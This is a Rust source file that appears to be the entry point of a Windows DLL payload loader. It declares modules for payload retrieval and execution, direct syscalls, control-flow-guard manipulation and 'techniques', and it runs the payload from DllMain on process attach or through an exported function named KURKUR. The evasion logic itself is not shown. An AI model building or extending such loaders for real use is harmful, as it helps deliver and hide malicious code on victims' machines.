// #![no_std]
#![no_main]
extern crate alloc;

mod cfg_manip;
mod get_payload;
mod hash;
mod intrinsics;
mod payload;
mod resolve;
mod run_payload;
mod syscalls;
mod techniques;
mod logger;

use windows_sys::Win32::{
    Foundation::{HINSTANCE, TRUE},
    System::SystemServices::DLL_PROCESS_ATTACH,
};

static mut DLL_MODULE_HANDLE: usize = 0;

#[unsafe(no_mangle)]
#[cfg(not(feature = "dll_main"))]
pub unsafe extern "C" fn KURKUR() {
    unsafe {
        run_payload::run_payload(DLL_MODULE_HANDLE as *mut u8);
    }
}

#[unsafe(no_mangle)]
#[allow(non_snake_case, unused_variables)]
unsafe fn DllMain(dll_module: HINSTANCE, call_reason: u32, _reserved: usize) -> i32 {
    match call_reason {
        DLL_PROCESS_ATTACH => unsafe {
            DLL_MODULE_HANDLE = dll_module as usize;
            #[cfg(feature = "dll_main")]
            unsafe {
                run_payload::run_payload(DLL_MODULE_HANDLE as *mut u8);
            }
        },
        _ => (),
    }
    TRUE
}
